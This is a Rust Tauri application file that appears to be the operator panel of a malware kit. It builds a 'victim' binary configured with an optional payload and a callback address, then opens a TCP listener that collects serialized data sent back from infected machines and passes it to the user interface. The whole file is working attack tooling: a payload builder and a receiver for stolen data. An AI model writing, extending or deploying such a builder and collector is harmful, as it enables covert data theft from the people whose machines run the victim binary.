#![cfg_attr(
    all(not(debug_assertions), target_os = "windows"),
    windows_subsystem = "windows"
)]

#[macro_use]
extern crate lazy_static;

use config::Config;
use data::Sends;
use std::fs::File;
use std::io::{Read, Write};
use std::net::TcpListener;
use std::process::Command;
use std::sync::{Arc, Mutex};
use std::thread;

lazy_static! {
    pub static ref HOOKS: Arc<Mutex<Vec<Sends>>> = Arc::new(Mutex::new(Vec::new()));
    pub static ref INDEX: Arc<Mutex<usize>> = Arc::new(Mutex::new(0));
    pub static ref DONE: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));
}

#[tauri::command]
fn gen(features: Vec<String>, mut payload: Option<String>, send_to: String) {
    thread::spawn(move || {
        if payload == Some("".to_string()) {
            payload = None;
        }
        let mut path = std::env::current_exe().unwrap();
        for _ in 0..4 {
            path.pop();
        }
        path.push("victim");
        path.push("config.toml");
        let config = Config {
            payload: payload.clone(),
            send_to: send_to.clone(),
        };
        let mut file = File::create(path.clone()).unwrap();
        file.write_all(toml::to_string(&config).unwrap().as_bytes())
            .unwrap();
        file.sync_all().unwrap();
        path.pop();
        let mut args = vec!["build", "--release"];
        for i in features.iter().map(|x| x.as_str()).collect::<Vec<_>>() {
            args.push("--features");
            args.push(i);
        }
        if payload.is_some() {
            args.push("--features");
            args.push("payload");
        }
        Command::new("cargo")
            .args(args)
            .current_dir(&path.display().to_string())
            .output()
            .expect("failed to execute process");

        thread::spawn(move || {
            let listener =
                TcpListener::bind(format!("0.0.0.0:{}", send_to.split(':').nth(1).unwrap()))
                    .unwrap();
            for stream in listener.incoming() {
                thread::spawn(move || {
                    let mut stream = stream.unwrap();
                    let mut total = Vec::new();
                    let mut buffer = [0; 4096];
                    while stream.read(&mut buffer).unwrap() == 4096 {
                        for i in buffer {
                            total.push(i);
                        }
                    }
                    for i in buffer {
                        total.push(i);
                    }
                    let new_sends: Sends = bincode::deserialize(&total).unwrap();
                    let hooks = Arc::clone(&HOOKS);
                    let mut hooks = hooks.lock().unwrap();
                    (*hooks).push(new_sends);
                });
            }
        });
        let done = Arc::clone(&DONE);
        let mut done = done.lock().unwrap();
        *done = true;
    });
}

#[tauri::command]
fn victim_payload() -> String {
    let mut path = std::env::current_exe().unwrap();
    for _ in 0..4 {
        path.pop();
    }
    for i in vec!["victim", "target", "release", "victim"] {
        path.push(i);
    }
    path.display().to_string()
}

#[tauri::command]
fn get_new() -> Vec<Sends> {
    let sends = (*HOOKS.lock().unwrap()).clone();
    let start_at = *INDEX.lock().unwrap();
    let index = Arc::clone(&INDEX);
    let mut index = index.lock().unwrap();
    *index = sends.len();
    return sends[start_at..].to_vec();
}

#[tauri::command]
fn is_done() -> bool {
    (*DONE.lock().unwrap()).clone()
}

fn main() {
    tauri::Builder::default()
        .invoke_handler(tauri::generate_handler![
            gen,
            victim_payload,
            get_new,
            is_done
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
